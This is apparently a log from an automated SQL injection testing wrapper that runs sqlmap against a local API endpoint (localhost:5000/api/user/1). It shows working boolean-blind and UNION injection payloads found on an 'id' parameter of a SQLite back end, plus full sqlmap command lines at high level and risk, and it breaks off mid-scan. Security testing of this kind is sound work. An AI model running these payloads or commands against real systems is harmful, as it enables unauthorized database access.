[18:50:40] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-3862 OR 5105=5105

    Type: UNION query
    Title: Generic UNION query (random number) - 3 columns
    Payload: id=-8835 UNION ALL SELECT 4128,CHAR(113,113,118,118,113)||CHAR(74,120,65,87,71,113,70,101,74,70,117,65,83,73,65,73,113,88,68,98,67,98,90,113,65,80,122,77,68,65,119,121,83,115,106,66,107,67,104,77)||CHAR(113,107,112,120,113),4128-- WSzk
---
[18:50:40] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:50:40] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[18:50:40] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[18:50:40] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap\localhost'

[*] ending @ 18:50:40 /2025-09-26/

2025-09-26 18:50:41,070 - WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Get_User_by_ID_dbs.log
2025-09-26 18:50:41,070 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/api/user/1
2025-09-26 18:50:44,458 - INFO -         ___
2025-09-26 18:50:44,458 - INFO -        __H__
2025-09-26 18:50:44,458 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:50:44,458 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:50:44,458 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 18:50:44,458 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:50:44,458 - INFO - 
2025-09-26 18:50:44,474 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:50:44,474 - INFO - 
2025-09-26 18:50:44,474 - INFO - [*] starting @ 18:50:44 /2025-09-26/
2025-09-26 18:50:44,474 - INFO - 
2025-09-26 18:50:46,810 - INFO - [18:50:46] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:50:46,810 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:50:46,820 - INFO - [18:50:46] [INFO] flushing session file
2025-09-26 18:50:46,830 - INFO - [18:50:46] [INFO] testing connection to the target URL
2025-09-26 18:50:46,895 - INFO - [18:50:46] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:50:46,905 - INFO - [18:50:46] [INFO] testing if the target URL content is stable
2025-09-26 18:50:47,353 - INFO - [18:50:47] [INFO] target URL content is stable
2025-09-26 18:50:47,353 - INFO - [18:50:47] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:50:47,398 - INFO - [18:50:47] [WARNING] URI parameter '#1*' does not appear to be dynamic
2025-09-26 18:50:47,418 - INFO - [18:50:47] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:50:47,444 - INFO - [18:50:47] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:50:47,499 - INFO - [18:50:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:50:47,598 - INFO - [18:50:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:50:47,620 - INFO - [18:50:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:50:47,692 - INFO - [18:50:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:50:47,746 - INFO - [18:50:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:50:47,811 - INFO - [18:50:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:50:47,859 - INFO - [18:50:47] [INFO] testing 'Generic inline queries'
2025-09-26 18:50:47,876 - INFO - [18:50:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:50:47,913 - INFO - [18:50:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:50:47,956 - INFO - [18:50:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:50:48,003 - INFO - [18:50:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:50:48,082 - INFO - [18:50:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:50:48,134 - INFO - [18:50:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:50:48,187 - INFO - [18:50:48] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:50:48,235 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:50:48,235 - INFO - [18:50:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:50:48,284 - INFO - [18:50:48] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:50:48,284 - INFO - [18:50:48] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:50:48,293 - INFO - [18:50:48] [WARNING] HTTP error codes detected during run:
2025-09-26 18:50:48,293 - INFO - 404 (Not Found) - 73 times
2025-09-26 18:50:48,293 - INFO - 
2025-09-26 18:50:48,293 - INFO - [*] ending @ 18:50:48 /2025-09-26/
2025-09-26 18:50:48,293 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/api/user/1
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:44 /2025-09-26/

[18:50:46] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:50:46] [INFO] flushing session file
[18:50:46] [INFO] testing connection to the target URL
[18:50:46] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:50:46] [INFO] testing if the target URL content is stable
[18:50:47] [INFO] target URL content is stable
[18:50:47] [INFO] testing if URI parameter '#1*' is dynamic
[18:50:47] [WARNING] URI parameter '#1*' does not appear to be dynamic
[18:50:47] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:50:47] [INFO] testing for SQL injection on URI parameter '#1*'
[18:50:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:50:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:50:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:50:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:50:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:50:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:50:47] [INFO] testing 'Generic inline queries'
[18:50:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:50:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:50:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:50:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:50:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:50:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:50:48] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:50:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:50:48] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:50:48] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:50:48] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 73 times

[*] ending @ 18:50:48 /2025-09-26/

2025-09-26 18:50:48,434 - INFO - Flushed sqlmap session for http://localhost:5000/api/user/1 (log: attack-logs-dynamic\Get_User_by_ID__API__flush.log)
2025-09-26 18:50:48,434 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/api/user/1 --output-dir 'attack-logs-dynamic\Get_User_by_ID__API__sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
2025-09-26 18:50:52,021 - INFO -         ___
2025-09-26 18:50:52,021 - INFO -        __H__
2025-09-26 18:50:52,021 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:50:52,021 - INFO - |_ -| . [(]     | .'| . |
2025-09-26 18:50:52,021 - INFO - |___|_  [.]_|_|_|__,|  _|
2025-09-26 18:50:52,021 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:50:52,021 - INFO - 
2025-09-26 18:50:52,053 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:50:52,053 - INFO - 
2025-09-26 18:50:52,053 - INFO - [*] starting @ 18:50:52 /2025-09-26/
2025-09-26 18:50:52,053 - INFO - 
2025-09-26 18:50:53,852 - INFO - [18:50:53] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID__API__sqlmap' as the output directory
2025-09-26 18:50:54,376 - INFO - [18:50:54] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:50:54,376 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:50:54,386 - INFO - [18:50:54] [INFO] testing connection to the target URL
2025-09-26 18:50:54,449 - INFO - [18:50:54] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:50:54,479 - INFO - [18:50:54] [INFO] testing if the target URL content is stable
2025-09-26 18:50:54,897 - INFO - [18:50:54] [INFO] target URL content is stable
2025-09-26 18:50:54,898 - INFO - [18:50:54] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:50:55,004 - INFO - [18:50:55] [WARNING] URI parameter '#1*' does not appear to be dynamic
2025-09-26 18:50:55,025 - INFO - [18:50:55] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:50:55,054 - INFO - [18:50:55] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:50:55,113 - INFO - [18:50:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:50:56,052 - INFO - [18:50:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:50:56,727 - INFO - [18:50:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:50:57,531 - INFO - [18:50:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:50:58,149 - INFO - [18:50:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:50:58,619 - INFO - [18:50:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:50:58,806 - INFO - [18:50:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:50:58,970 - INFO - [18:50:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:50:59,212 - INFO - [18:50:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:50:59,626 - INFO - [18:50:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:50:59,943 - INFO - [18:50:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:51:00,364 - INFO - [18:51:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:00,786 - INFO - [18:51:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:01,096 - INFO - [18:51:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:51:01,737 - INFO - [18:51:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:02,341 - INFO - [18:51:02] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:02,818 - INFO - [18:51:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:03,558 - INFO - [18:51:03] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:04,121 - INFO - [18:51:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:04,824 - INFO - [18:51:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:05,434 - INFO - [18:51:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:06,264 - INFO - [18:51:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:06,884 - INFO - [18:51:06] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:07,618 - INFO - [18:51:07] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:08,114 - INFO - [18:51:08] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:08,745 - INFO - [18:51:08] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:09,239 - INFO - [18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:09,257 - INFO - [18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:51:09,267 - INFO - [18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:51:09,267 - INFO - [18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:51:09,296 - INFO - [18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:51:09,296 - INFO - [18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:51:09,308 - INFO - [18:51:09] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:51:09,318 - INFO - [18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:51:09,342 - INFO - [18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:09,342 - INFO - [18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:51:09,358 - INFO - [18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:51:09,375 - INFO - [18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:51:09,399 - INFO - [18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:09,399 - INFO - [18:51:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:51:09,422 - INFO - [18:51:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:09,422 - INFO - [18:51:09] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:51:09,448 - INFO - [18:51:09] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:09,457 - INFO - [18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:51:09,480 - INFO - [18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:09,480 - INFO - [18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:51:09,503 - INFO - [18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:51:09,503 - INFO - [18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:51:09,524 - INFO - [18:51:09] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:51:09,524 - INFO - [18:51:09] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:09,564 - INFO - [18:51:09] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:09,565 - INFO - [18:51:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:09,565 - INFO - [18:51:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:09,565 - INFO - [18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:09,607 - INFO - [18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:09,607 - INFO - [18:51:09] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:51:09,653 - INFO - [18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:51:09,687 - INFO - [18:51:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:09,687 - INFO - [18:51:09] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:09,718 - INFO - [18:51:09] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:09,718 - INFO - [18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:09,760 - INFO - [18:51:09] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:09,760 - INFO - [18:51:09] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:09,804 - INFO - [18:51:09] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:09,807 - INFO - [18:51:09] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:51:09,846 - INFO - [18:51:09] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:09,849 - INFO - [18:51:09] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:51:10,456 - INFO - [18:51:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:10,926 - INFO - [18:51:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:10,940 - INFO - [18:51:10] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:51:11,364 - INFO - [18:51:11] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:51:11,839 - INFO - [18:51:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:51:12,253 - INFO - [18:51:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:51:12,772 - INFO - [18:51:12] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:51:13,234 - INFO - [18:51:13] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:51:13,675 - INFO - [18:51:13] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:51:14,126 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:51:14,126 - INFO - [18:51:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:14,468 - INFO - [18:51:14] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:51:14,734 - INFO - [18:51:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:15,065 - INFO - [18:51:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:51:15,360 - INFO - [18:51:15] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:51:15,361 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 18:51:15,361 - INFO - [18:51:15] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 18:51:15,371 - INFO - [18:51:15] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 18:51:15,383 - INFO - [18:51:15] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 18:51:15,390 - INFO - [18:51:15] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 18:51:15,453 - INFO - [18:51:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:51:15,835 - INFO - [18:51:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:51:16,422 - INFO - [18:51:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:51:16,807 - INFO - [18:51:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:51:17,104 - INFO - [18:51:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:51:17,568 - INFO - [18:51:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:51:17,664 - INFO - [18:51:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:51:17,793 - INFO - [18:51:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:51:17,862 - INFO - [18:51:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:51:18,067 - INFO - [18:51:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:51:18,404 - INFO - [18:51:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:51:18,624 - INFO - [18:51:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:18,819 - INFO - [18:51:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:19,126 - INFO - [18:51:19] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:51:19,474 - INFO - [18:51:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:19,859 - INFO - [18:51:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:20,432 - INFO - [18:51:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:20,807 - INFO - [18:51:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:21,332 - INFO - [18:51:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:21,653 - INFO - [18:51:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:22,347 - INFO - [18:51:22] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:22,794 - INFO - [18:51:22] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:23,372 - INFO - [18:51:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:23,685 - INFO - [18:51:23] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:24,299 - INFO - [18:51:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:24,638 - INFO - [18:51:24] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:25,186 - INFO - [18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:25,192 - INFO - [18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:51:25,213 - INFO - [18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:51:25,218 - INFO - [18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:51:25,230 - INFO - [18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:51:25,240 - INFO - [18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:51:25,258 - INFO - [18:51:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:51:25,270 - INFO - [18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:51:25,279 - INFO - [18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:25,283 - INFO - [18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:51:25,295 - INFO - [18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:51:25,305 - INFO - [18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:51:25,305 - INFO - [18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:25,324 - INFO - [18:51:25] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:51:25,334 - INFO - [18:51:25] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:25,344 - INFO - [18:51:25] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:51:25,360 - INFO - [18:51:25] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:25,383 - INFO - [18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
